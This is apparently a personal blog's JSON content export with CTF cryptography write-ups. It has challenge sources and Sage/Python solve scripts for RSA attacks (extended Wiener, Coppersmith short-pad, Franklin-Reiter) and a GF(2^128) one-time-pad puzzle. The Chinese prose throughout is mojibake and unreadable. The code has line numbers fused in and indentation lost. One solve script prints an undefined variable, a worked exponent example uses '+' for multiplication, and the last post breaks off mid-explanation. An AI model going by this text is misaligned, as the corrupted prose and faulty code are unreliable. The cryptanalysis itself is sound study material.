{"pages":[{"title":"Link","text":"å‹æƒ…é“¾æ¥ è¿™ä¸ªevenä¸»é¢˜å¤ªå¥½çœ‹å•¦, å°½ç®¡å®ƒæ²¡æœ‰å‹é“¾çš„é¡µé¢.é‚£æˆ‘å°±æ‰‹åŠ¨æ·»åŠ ä¸€ä¸‹, ä¸‹é¢çš„éƒ½æ˜¯å¤§å¤§å¤§å¤§å¤§å¸ˆå‚…, æ’åä¸åˆ†å…ˆå deebato - è¥¿ç”µçš„å¯†ç å¸ˆå‚…!!!!!! To1in - å—é‚®çš„å¯†ç å¸ˆå‚…!!!!!! K1rit0 - åŒåçš„PwnğŸ‘´","link":"/link/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"who am I ?Just a student love Crypto and Web.(And LXY XD This blog only update some post about CTF. If you want to know more about my life , you can visit http://jnut3519.top:8090 QQ: 3519728596","link":"/about/index.html"}],"posts":[{"title":"Crypto - onetimepad2, understand the nature of the algorithm","text":"0ctf quals 2017çš„é¢˜, æ˜¯ä¹‹å‰åšè¿‡çš„onetimepadçš„å‡çº§ç‰ˆ. å› ä¸ºè¿™é“é¢˜æ¶‰åŠåˆ°äº†æœ‰é™åŸŸä¸‹ä¹˜æ³•, çŸ©é˜µä¹˜æ³•, å¿«é€Ÿå¹‚, ç¦»æ•£å¯¹æ•°, æ‰€ä»¥è®°å½•ä¸€ä¸‹(å­¦è´¹äº†å­¦è´¹äº†â€¦ é¢˜ç›®æºç å…ˆä¸Šä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#!/usr/bin/env python# coding=utf-8from os import urandomdef process1(m, k): res = 0 for i in bin(k)[2:]: res = res &lt;&lt; 1; if (int(i)): res = res ^ m if (res &gt;&gt; 128): res = res ^ P return resdef process2(a, b): res = [] res.append(process1(a[0], b[0]) ^ process1(a[1], b[2])) res.append(process1(a[0], b[1]) ^ process1(a[1], b[3])) res.append(process1(a[2], b[0]) ^ process1(a[3], b[2])) res.append(process1(a[2], b[1]) ^ process1(a[3], b[3])) return resdef nextrand(rand): global N, A, B tmp1 = [1, 0, 0, 1] tmp2 = [A, B, 0, 1] s = N N = process1(N, N) while s: if s % 2: tmp1 = process2(tmp2, tmp1) tmp2 = process2(tmp2, tmp2) s = s / 2 return process1(rand, tmp1[0]) ^ tmp1[1]def keygen(): key = str2num(urandom(16)) while True: yield key key = nextrand(key)def encrypt(message): length = len(message) pad = '\\x00' + urandom(15 - (length % 16)) to_encrypt = message + pad res = '' generator = keygen() f = open('key.txt', 'w') # This is used to decrypt and of course you won't get it. for i, key in zip(range(0, length, 16), generator): f.write(hex(key)+'\\n') res += num2str(str2num(to_encrypt[i:i+16]) ^ key) f.close() return resdef decrypt(ciphertxt): # TODO passdef str2num(s): return int(s.encode('hex'), 16)def num2str(n, block=16): s = hex(n)[2:].strip('L') s = '0' * ((32-len(s)) % 32) + s return s.decode('hex')P = 0x100000000000000000000000000000087A = 0xc6a5777f4dc639d7d1a50d6521e79bfdB = 0x2e18716441db24baf79ff92393735345N = str2num(urandom(16))assert N != 0if __name__ == '__main__': with open('top_secret') as f: top_secret = f.read().strip() assert len(top_secret) == 16 plain = &quot;One-Time Pad is used here. You won't know that the flag is flag{%s}.&quot; % top_secret with open('ciphertxt', 'w') as f: f.write(encrypt(plain).encode('hex')+'\\n') æ•´ä¸ªæµç¨‹æŒºç®€å•çš„, å°±æ˜¯å¯¹palinåŠ å¯†. ä½†æ˜¯é‡Œé¢çš„æ¯ä¸ªå‡½æ•°éƒ½æŒºæœ‰æ„æ€çš„. ä¸‹é¢ä¸€ä¸ªä¸€ä¸ªæ¥åˆ†æ process1(m,k)å…ˆçœ‹process1(m,k)å¾ˆå¤šæ—¶å€™è¿™ç§çœ‹ç€å°±åƒåœ¨ä¸€ä¸ªåŸŸé‡Œé¢åšçš„è®¡ç®—, å¯ä»¥éšä¾¿å‡ ä¸ªå°çš„æ•°è¿›å»çœ‹çœ‹ç»“æœæ˜¯ä»€ä¹ˆ. å¦‚æœæ˜¯ä¸€äº›ç®€å•çš„æ“ä½œæ¯”å¦‚åŠ å‡ä¹˜é™¤å•¥çš„ä¸€èˆ¬å¾ˆå®¹æ˜“èƒ½çœ‹å‡ºæ¥.è€Œè¿™ä¸ªprocess1(m,k)å°±æ˜¯åœ¨GF(2^128)ä¸‹åšm*k. å¯ä»¥ç†è§£ä¸ºå°±æ˜¯ä¸€ä¸ªä¹˜æ³•å§. ä¸ºä»€ä¹ˆæ˜¯ä¸ªä¹˜æ³•å‘¢?å¹³æ—¶çº¸ä¸Šç®—ä¹˜æ³•çš„æ—¶å€™éƒ½è¦ç”¨åˆ°ç«–å¼, è€Œè¿™é‡Œçš„ç®—æ³•å°±æ˜¯ä¸€ä¸ªå…ˆè®¡ç®—é«˜ä½çš„ç«–å¼.ä»æœ€é«˜ä½å¼€å§‹ä¸€ä½ä¸€ä½å¾€ä¸‹ä¹˜.(è¿™ä¸ªç”¨çº¸ä¸Šå†™å‡ºæ¥ä¼šå¥½ç†è§£å§, è¿™é‡Œå°±ä¸å†™äº† process2(a,b)è¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸ªçŸ©é˜µçš„ä¹˜æ³•, è¾“å‡ºçš„å°±æ˜¯ çŸ©é˜µa * çŸ©é˜µb. æ€ä¹ˆçœ‹å‡ºæ¥?ç»éªŒ? ä¸€èˆ¬é‡åˆ°è¿™ç§ä¸¤ä¸ªçŸ©é˜µ(æ•°åˆ—)ç‰¹å®šä¸‹æ ‡åœ¨è¿›è¡ŒåŠ å’Œä¹˜è®¡ç®—çš„, æŠŠæ¯ä¸ªå¼å­å†™å‡ºæ¥, çœ‹èƒ½ä¸èƒ½å†™æˆä¸¤ä¸ªçŸ©é˜µä¹‹é—´çš„æ“ä½œ, è€Œè¿™é‡Œå°±æ˜¯ä¸€ä¸ªçŸ©é˜µçš„ä¹˜æ³• nextrand(rand)è¿™ä¸ªå‡½æ•°æ‰æ˜¯é‡ç‚¹!!! 123456789101112def nextrand(rand): global N, A, B tmp1 = [1, 0, 0, 1] tmp2 = [A, B, 0, 1] s = N N = process1(N, N) while s: if s % 2: tmp1 = process2(tmp2, tmp1) tmp2 = process2(tmp2, tmp2) s = s / 2 return process1(rand, tmp1[0]) ^ tmp1[1] çœ‹ä¸æ‡‚çš„åœ°æ–¹å°±æ˜¯ä¸­é—´çš„å¾ªç¯ç»“æ„, ä¸çŸ¥é“å…·ä½“åœ¨å¹²ä»€ä¹ˆ. æŸ¥äº†ä¸€ä¸‹wpæ‰çŸ¥é“, è¿™æ˜¯ä¸ªå¿«é€Ÿå¹‚!!!æ²¡æƒ³åˆ°ç¬¬ä¸€æ¬¡æ¥è§¦å¿«é€Ÿå¹‚æ˜¯åœ¨å¯†ç çš„é¢˜ç›®é‡Œâ€¦ å¿«é€Ÿå¹‚ç®€å•è¯´ä¸€ä¸‹å¿«é€Ÿå¹‚å§, è®¡ç®—æœºè®¡ç®—ä¸€ä¸ªæ•°çš„é«˜æ¬¡å¹‚(ä¾‹å¦‚3^60^)çš„æ—¶å€™, å¦‚æœç›´æ¥è®¡ç®—60ä¸ª3ç›¸ä¹˜å°±ä¼šç‰¹åˆ«æ…¢, ä½†æ˜¯å¯ä»¥æŠŠ 3^60^ åŒ–æˆ 9^30^, è¿™æ ·å°±åªéœ€è¦ä¹˜30æ¬¡äº†.ç»§ç»­ç®—ä¸‹å»ä¼šå‘ç”Ÿä¸€ä¸ªé—®é¢˜ 3^60^ = 9^30^ = 81^15^ è¿™é‡Œæœ‰ä¸ª15æ¬¡å¹‚, å¦‚æœé™¤ä»¥2å°±æ˜¯7.5, 7.5æ¬¡å¹‚æ˜¯æ²¡åŠæ³•è®¡ç®—çš„. æ‰€ä»¥è¿™é‡Œæœ‰ä¸ªæ“ä½œ, å°±æ˜¯81^15^ = 81^14^ * 81^1^, ç„¶åç»§ç»­å¯¹81^14^è¿›è¡ŒåŒ–ç®€.æ‰€ä»¥æœ€ç»ˆçš„ç»“æœå°±æ˜¯ 1233^60 = 9^30 = 81^15 = 81^14 * 81^1 = 6561^7 + 81^1 =....= 43046721^3 * 43046721^1 * 6561^1 * 81^1= 1853020188851841^1 * 43046721^1 * 6561^1 * 81^1 å¯ä»¥çœ‹åˆ°ç»“æœæœ‰ä¸ªç‰¹ç‚¹, å°±æ˜¯æœ€åä¸€å®šä¼šåŒ–æˆå¤šä¸ªæ•°çš„ä¸€æ¬¡å¹‚çš„ä¹˜ç§¯.è€Œä»€ä¹ˆæ—¶å€™èƒ½åˆ†å‡ºä¸€æ¬¡å¹‚å‘¢? å°±æ˜¯æ¬¡å¹‚ä¸ºå¥‡æ•°çš„æ—¶å€™!!! å›åˆ°å‡½æ•°å›åˆ°å‡½æ•°é‡Œ, ç»“åˆä¸Šé¢è¯´çš„å¿«é€Ÿå¹‚çš„ç®—æ³•, å¯ä»¥çœ‹å‡ºè¿™ä¸ªå¾ªç¯å°±æ˜¯è®¡ç®—tmp1 = tmp2^s, æœªå®Œå¾…ç»­â€¦.","link":"/2020/10/30/Crypto-onetimepad2-understand-the-nature-of-the-algorithm/"},{"title":"2020çºµæ¨ªæ¯ comon-Extending Wiener attack","text":"problem1234567891011121314151617from Crypto.Util.number import *e1 = 28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581e2 = 131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563N = 159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253flag = b&quot;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}&quot;f1 = bytes_to_long(flag[:21])f2 = bytes_to_long(flag[21:])c1 = pow(f1, e1, N)c2 = pow(f2, e2, N)print(&quot;e1 = &quot;, e1)print(&quot;e2 = &quot;, e2)print(&quot;N = &quot;, N)print(&quot;c1 = &quot;, c1)print(&quot;c2 = &quot;, c2) åˆ†æè¿™ä¸ªé¢˜ä¸€çœ‹è¿˜ä»¥ä¸ºæ˜¯ç®€å•çš„Common Attack, åªæœ‰åŒä¸€ä¸ªæ˜æ–‡, ä¸åŒçš„$e$æ‰èƒ½ç”¨Common Attack è¿™é‡Œæ˜¾ç„¶ä¸¤ä¸ªå¯†æ–‡å¯¹åº”çš„ä¸æ˜¯åŒä¸€ä¸ªæ˜æ–‡â€¦è¿™ç§é¢˜ä¼°è®¡éƒ½æœ‰ä»€ä¹ˆæ”»å‡»æ–¹æ³•, åæ¥æ‰¾wpçœ‹äº†, æœç„¶æ˜¯æœ‰ä¸€ç§æ”»å‡»æ–¹æ³•çš„, æŠŠpaper(Extending Wienerâ€™s Attack in the Presence of Many Decrypting Exponents)è¯¦ç»†çš„å­¦äº†ä¸€é, æ‰æ˜ç™½å…·ä½“è¯¥æ€ä¹ˆè§£, è¿™ä¸ªæ”»å‡»æ–¹æ³•é€‚ç”¨äº$e$ç‰¹åˆ«å¤§, å¹¶ä¸”æœ‰å¤šä¸ª$e$çš„æ—¶å€™(æ˜¾ç„¶$e$è¿˜æœ‰å¤§åˆ°å¯ä»¥ç›´æ¥winner)å¤§æ¦‚æ€è·¯æ˜¯é€ ä¸€ä¸ªæ ¼å­æ±‚å‡ºå‚æ•°è®©é—®é¢˜è½¬å˜æˆwinnerè¦è§£å†³çš„é—®é¢˜(è¿åˆ†æ•°çš„åˆ†è§£), ä½†æ˜¯è¿™é‡Œ$g$æ˜¯ä¸º1çš„æ‰€ä»¥ä¸éœ€è¦è¿åˆ†æ•°å¯ä»¥ç›´æ¥æ±‚å‡ºphi æ„é€ æ ¼å­çš„æ–¹æ³•paperé‡Œæœ‰, é˜…è¯»ç¬”è®°é‡Œä¹Ÿæœ‰è¿™é‡Œå°±ä¸å¤šè¯´, ç›´æ¥é€ !$$L_2 =\\begin{pmatrix}N&amp;-M_1N&amp;0&amp;N^2 \\\\0&amp;M_1e_1&amp;-M_2e_1&amp;-e_1N \\\\0&amp;0&amp;M_2e_2&amp;-e_2N \\\\0&amp;0&amp;0&amp;e_1e_2\\end{pmatrix}$$è¿™é‡Œ$M_1 = N^{1 \\over 2},M_2 = N^{1+\\alpha_2},\\alpha_2 = {5 \\over 14 } - \\epsilonâ€™$LLL()è§„çº¦å‡ºåŸº$b =(b_1,b_2,b_3,b_4)$åæ±‚phiå³å¯ exp123456789101112131415161718192021222324252627282930from Crypto.Util.number import long_to_bytese1 = 28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581e2 = 131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563N = 159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253c1 = 89410578059910615243542114610890994179298819076294899300341196922537672226283347286177838507350481980653301675042566354947161446918391494634173771489921535378415952543761341962187827617956463740415683816828323475428328607025791449389552492799278886876413138326117622825124519567340298133646090783889193450681c2 = 106022564245731443282859231814772725680579944691962958987527668508496192529331599682371642691880849071915084510118117099828154554231286326729922119326305261125960484865171940233343041874124811917291652357776045940511178855947892557181650249473057939642726565131933445072147505756108121271288834439942107732015for epsilon in range(100): M1 = int(N^(0.5)) M2 = int(N^(1+5/14 - (epsilon*0.01))) #epsilonæ˜¯æ²¡åŠæ³•ç¡®å®šçš„, å°å°çš„çˆ†ç ´ä¸€ä¸‹ v1 = vector([N,-M1*N,0,N^2]) v2 = vector([0,M1*e1,-M2*e1,-e1*N]) v3 = vector([0,0,M2*e2,-e2*N]) v4 = vector([0,0,0,e1*e2]) L = Matrix([v1,v2,v3,v4]) B = L.LLL()[0] B = L.solve_left(B) phi = floor(e1 * B[1]//B[0]) # è¿™è¾¹phiä¼šå‰åå·®1æˆ–è€…å·®2 for j in range(-2,3): try: d1 = inverse_mod(e1,phi+j) d2 = inverse_mod(e2,phi+j) flag = long_to_bytes(pow(c1,d1,N)) + long_to_bytes(pow(c2,d2,N)) if b'{' in flag and b'}' in flag: print(i,flag) except: pass åè®°çœ‹å®Œäº†ç†è®ºè‡ªå·±ä»£ç å®ç°çš„æ—¶å€™è¿˜æ˜¯ä¼šæœ‰ä¸å°‘é—®é¢˜çš„.. è¿™é‡Œæœ‰ä¸€ä¸ªMatrix.solve_leftå’ŒMatrix.solve_rightçš„åŒºåˆ«, ä¹Ÿæ²¡æ€ä¹ˆææ‡‚, ä¸»è¦æ˜¯ä¸çŸ¥é“è¿™ä¸¤ä¸ªåˆ°åº•ä»€ä¹ˆæ—¶å€™ç”¨ä»€ä¹ˆ, åªèƒ½å…ˆæ¯æ¬¡éƒ½è¯•è¯•è¿™ä¸¤ä¸ªäº†.","link":"/2021/03/12/2020%E7%BA%B5%E6%A8%AA%E6%9D%AF-comon-Extending-Wiener-attack/"},{"title":"cryptoå¤å¥-2021é•¿åŸæ¯","text":"0x00 baby_rsaproblem1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python3from Crypto.Util.number import *from secret import flag, v1, v2, m1, m2def enc_1(val): p, q = pow(v1, (m1+1))-pow((v1+1), m1), pow(v2, (m2+1))-pow((v2+1), m2) assert isPrime(p) and isPrime(q) and ( p*q).bit_length() == 2048 and q &lt; p &lt; q &lt;&lt; 3 return pow(val, 0x10001, p*q)def enc_2(val): assert val.bit_length() &lt; 512 while True: fac = [getPrime(512) for i in range(3)] if isPrime(((fac[0]+fac[1]+fac[2]) &lt;&lt; 1) - 1): n = fac[0]*fac[1]*fac[2]*(((fac[0]+fac[1]+fac[2]) &lt;&lt; 1) - 1) break c = pow(val, 0x10001, n) return (c, n, ((fac[0]+fac[1]+fac[2]) &lt;&lt; 1) - 1)if __name__ == &quot;__main__&quot;: assert flag[:5] == b'flag{' plain1 = bytes_to_long(flag[:21]) plain2 = bytes_to_long(flag[21:]) print(enc_1(plain1)) print(enc_2(plain2))'''15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311(40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083, 43001726046955078981344016981790445980199072066019323382068244142888931539602812318023095256474939697257802646150348546779647545152288158607555239302887689137645748628421247685225463346118081238718049701320726295435376733215681415774255258419418661466010403928591242961434178730846537471236142683517399109466429776377360118355173431016107543977241358064093102741819626163467139833352454094472229349598479358367203452452606833796483111892076343745958394932132199442718048720633556310467019222434693785423996656306612262714609076119634814783438111843773649519101169326072793596027594057988365133037041133566146897868269, 39796272592331896400626784951713239526857273168732133046667572399622660330587881579319314094557011554851873068389016629085963086136116425352535902598378739)''' solveä¹Ÿä¸çŸ¥é“ä¸ºå•¥ï¼Œçœ‹äº†åˆ«çš„çˆ·çš„wpè¯´vå’Œméƒ½æ˜¯å¾ˆå°çš„æ•°ï¼Œç›´æ¥çˆ†ç ´å°±å®Œäº‹äº†â€¦(å¯èƒ½æ˜¯å› ä¸ºæˆ‘æ˜¯å¤ç›˜æ‰€ä»¥å°‘äº†ç‚¹hintï¼Ÿï¼Ÿï¼Ÿ) å‰©ä¸‹çš„å¦ä¸€åŠï¼Œç»™å‡ºçš„ä¸€ä¸ªå› æ•°éƒ½æ¯”må¤§äº†ï¼Œç›´æ¥ç”¨å®ƒåšå°±å¥½äº†ï¼Œå°±æ˜¯ä¸çŸ¥é“ä¸ºå•¥è„šæœ¬é‡Œéƒ½è¯´æ˜¯ç´ æ•°äº†ï¼Œå´è¿˜æ˜¯å¯ä»¥åˆ†è§£çš„â€¦â€¦ 123456789101112131415161718192021from gmpy2 import invertfrom tqdm import tqdmfrom Crypto.Util.number import long_to_bytes,isPrimec1 = 15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311c2 = 40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083fac4 = 39796272592331896400626784951713239526857273168732133046667572399622660330587881579319314094557011554851873068389016629085963086136116425352535902598378739d = invert(0x10001,190*192*627382*1720754738477317127758682285465031939891059835873975157555031327070111123628789833299433549669619325160679719355338187877758311485785197492710490)m2 = long_to_bytes(pow(c2 % fac4,d,fac4)).decode()for v in tqdm(range(2,300)): for m in range(2,300): p = pow(v,m+1) - pow(v+1,m) if isPrime(p): d = invert(0x10001,p-1) m1 = pow(c1 % p,d,p) try: m1 = long_to_bytes(m1).decode() if 'flag' in m1: print(m1+m2) except: pass â€¦æŒºç¦»è°±çš„ï¼Ÿ","link":"/2022/02/21/2021%E9%95%BF%E5%9F%8E%E6%9D%AF/"},{"title":"HITCTF2020 ezRSA - The learing or Coppersmith attack","text":"å…³äºå‡ºå»ç©åªèƒ½åœ¨æ‰‹æœºä¸Šç”¨Sage Cell Serveråšé¢˜é‚£ä»¶äº‹ä¹Ÿæ˜¯å¥½ä¹…æ²¡å†™åšå®¢äº†, åˆšå¥½å­¦ä¹ ä¸€ä¸‹coppersmith attack å…ˆæŠŠé¢˜ç›®æ”¾ä¸Šæ¥å§ 123456789101112131415161718192021222324252627282930313233#! /bin/bash python2from flag import flagfrom Crypto.Util.number import *import osflag = flag+os.urandom(32)p = getPrime(512)q = getPrime(512)n = p*qe = 3phi = (p-1)*(q-1)d = inverse(e,phi)m1 = bytes_to_long(flag)m2 = bytes_to_long(flag+os.urandom(8))assert pow(m1,3) &gt; nc1 = pow(m1,e,n)c2 = pow(m2,e,n)print &quot;c1 = %d&quot;%c1print &quot;c2 = %d&quot;%c2print &quot;n = %d&quot;%n'''c1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083c2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127''' åšè¿™ä¸ªä¹‹å‰, å…ˆæ¥çœ‹çœ‹coppersmith attack(ç›´æ¥ç¿»CTF wiki å¯¹äºå•å˜é‡çš„æ–¹ç¨‹(å¤šå˜é‡çš„è¿˜æ²¡æ¥è§¦è¿‡, èƒ½å¦ä½¿ç”¨coppersmith attack å°±çœ‹å˜é‡æ˜¯å¦æ»¡è¶³ä¸Šé¢è¿™éƒ¨åˆ†æ‰€æåˆ°çš„çº¦æŸ. æ¥åˆ†æä¸€ä¸‹è¿™äº›çº¦æŸ, å¯¹äºä¸€èˆ¬çš„RSAåˆ—å‡ºæ¨¡Næ„ä¹‰ä¸‹çš„å¤šé¡¹å¼æ–¹ç¨‹æ±‚è§£æ ¹çš„æ—¶å€™, å› ä¸ºNå¾€å¾€æ˜¯ä¸¤ä¸ªå¤§ç´ æ•°çš„ä¹˜ç§¯, é‚£ä¹ˆNå¿…å®šä¼šæœ‰ä¸€ä¸ªå› å­ $b$ æ˜¯æ»¡è¶³ $b &gt; N^{0.5}$ çš„, æ‰€ä»¥ä¸€èˆ¬ $Î²$ æ˜¯å–0.4~0.6çš„ ä½†æ˜¯æœ‰éœ€è¦æ³¨æ„çš„æ˜¯, æœ‰æ—¶å€™æ±‚è§£æ ¹å¹¶ä¸æ˜¯åœ¨æ¨¡Nçš„æ„ä¹‰ä¸‹è¿›è¡Œçš„, è¿™ä¸ªæ—¶å€™å°±éœ€è¦æ…é‡çš„è€ƒè™‘ä¸€ä¸‹$Î²$çš„å–å€¼äº† è€Œå¯¹äº $Î´$ , ä¹Ÿå°±æ˜¯å¤šé¡¹å¼çš„é˜¶æ•°, é˜¶æ•°è¶Šå°å¯¹æ ¹çš„çº¦æŸå°±è¶Šå®½æ¾, è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆCTF wikiä¸Šä¼šæœ‰è¿™ä¹ˆä¸€å¥ æ‰€ä»¥, åˆ¤æ–­æ˜¯å¦å¯ä»¥ä½¿ç”¨coppersmith attack, å°±çœ‹éœ€è¦è§£çš„æ ¹æ˜¯å¦è¶³å¤Ÿå°(ä¸€èˆ¬é€šè¿‡é¢˜ç›®æ‰€ç»™çš„ä¿¡æ¯æ¥åˆ¤æ–­æ ¹çš„ä½æ•°, å†é€šè¿‡e å’Œ N çš„ä½æ•°,æ¥åˆ¤æ–­æ˜¯å¦å¯ä»¥ä½¿ç”¨coppersmith attack éœ€è¦æ³¨æ„çš„æ˜¯!ç”±äºLLLæ˜¯å¯å‘å¼ç®—æ³•, æ‰€ä»¥æœ‰çš„æ—¶å€™è§£å‡ºæ¥çš„æ ¹ä¼šä¸æ»¡è¶³çº¦æŸ, ä¹Ÿå°±æ˜¯è¯´å½“éœ€è¦è§£çš„æ ¹è¿‘ä¹è¶³å¤Ÿå°å°±å¯ä»¥è¯•è¯•coppersmithäº† ç°åœ¨å›åˆ°é¢˜ç›®, å…ˆæ¥åˆ†æä¸€ä¸‹é¢˜ç›® è¿™é¢˜å…ˆå¯¹flagè¿›è¡Œäº†ä¸€æ¬¡å¡«å……flag = flag+os.urandom(32), å¦‚æœflagå¤ªå°æ˜¯å¯èƒ½ç›´æ¥è§£å‡ºæ¥çš„. ç„¶åå°±æ˜¯å¯¹æ˜æ–‡è¿›è¡ŒåŠ å¯†,å†è¿›è¡Œä¸€æ¬¡å¡«å……å†åŠ å¯†, å†™æˆå¼å­å°±æ˜¯$$m^3 = c_1 \\ (mod \\ n) \\(2^{64}m + diff)^3 = c_2 \\ (mod \\ n )$$ å…¶å®å¯ä»¥ä»¤M=2^64^m å’Œ $c_1 = 2^{192}c_1$, å°±å¯ä»¥æœ‰$$M^3 = c_1 \\ (mod \\ n) \\(M + diff)^3 = c_2 \\ (mod \\ n)$$ä¸¤ä¸ªæ–¹ç¨‹, ä¸¤ä¸ªæœªçŸ¥æ•°, è‚¯å®šæ˜¯å¯ä»¥è§£å‡ºæ ¹æ¥çš„, åªä¸è¿‡æ˜¯éš¾ä¸éš¾è§£å‡ºæ¥çš„é—®é¢˜äº†. æ³¨æ„åˆ°è¿™é‡Œçš„$diff$ æ˜¯64ä½çš„, è€Œ$N$æ˜¯1024ä½çš„, e=3ä¹Ÿå¾ˆå°, å¯ä»¥è€ƒè™‘è¯•è¯•coppersmithå…ˆè§£å‡º$diff$. äº‹å®ä¸Šè§£$diff$ç”¨åˆ°çš„å°±æ˜¯Coppersmithâ€™s short-pad attack Coppersmithâ€™s short-pad attack wikiä¸Šè¯´çš„ä¹Ÿå¾ˆæ¸…æ¥šäº†, åœ¨å¯¹æ˜æ–‡è¿›è¡Œå¡«å……çš„æ—¶å€™, å¦‚æœå¡«å……çš„$diff$ä½æ•°å¾ˆå°‘,å°±å¯ä»¥ç®—å‡º$diff$,åªéœ€è¦$diff &lt; N^{1/e}$, å°±å¯ä»¥è§£å‡º$diff$äº†. åœ¨è¿™é‡Œæ˜¾ç„¶æ˜¯æ»¡è¶³çš„. æˆ‘ä»¬å…ˆæŠŠä¸¤ä¸ªæ–¹ç¨‹åŒ–æˆåªæœ‰ä¸€ä¸ªæœªçŸ¥æ•°$diff$çš„æ–¹ç¨‹(ä»£ç é‡Œdiff = xn ,ç„¶åç”¨small_root()æ±‚è§£ 12345678910111213141516171819202122232425C1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083C2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127C1=(C1*2**192)%ne = 3n1 = nPRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n1))PRx.&lt;xn&gt; = PolynomialRing(Zmod(n1))PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n1)) g1 = x**e - C1g2 = (x + y)**e - C2 q1 = g1.change_ring(PRZZ)q2 = g2.change_ring(PRZZ)h = q2.resultant(q1)h = h.univariate_polynomial()h = h.change_ring(PRx).subs(y=xn)h = h.monic()roots = h.small_roots(X=2**64, beta=0.4)diff = roots[0]# diff = 15325913216714639606 è¿™é‡Œçš„small_root()çš„å‚æ•°å¾ˆé‡è¦, Xæ˜¯è®¾ç½®æ ¹çš„ä¸Šç•Œçš„, è¿™ä¸ªè¦å°½å¯èƒ½çš„æ¥è¿‘æ ¹çš„å¤§å°, è¿™æ ·æ±‚è§£å‡ºæ¥çš„å¯èƒ½æ€§æ‰é«˜. è€Œbetaä¸€èˆ¬0.4~0.6å°±è¡Œäº†. æ¥ä¸‹æ¥å°±æ˜¯ç®—Mäº†, è¿™ä¸ªåˆæ˜¯å¦å¤–ä¸€ä¸ªmethod - Franklin-Reiter related-message attack Franklin-Reiter related-message attackå…ˆæ¥çœ‹çœ‹wikiä¸Šæ€ä¹ˆè¯´é€šä¿—ä¸€ç‚¹å°±æ˜¯, å½“ä¸¤ä¸ªæ˜æ–‡æ»¡è¶³çº¿æ€§å…³ç³»$M_2 = aM_1+b$çš„æ—¶å€™,$x - M_2$æ˜¯ä¸¤ä¸ªæ–¹ç¨‹$$g_1(x) = f(x)^e - C_1 \\ (mod \\ N) \\g_2(x) = x^e - C_2 \\ (mod \\ N)$$çš„ä¸€ä¸ªå…¬å› å¼, 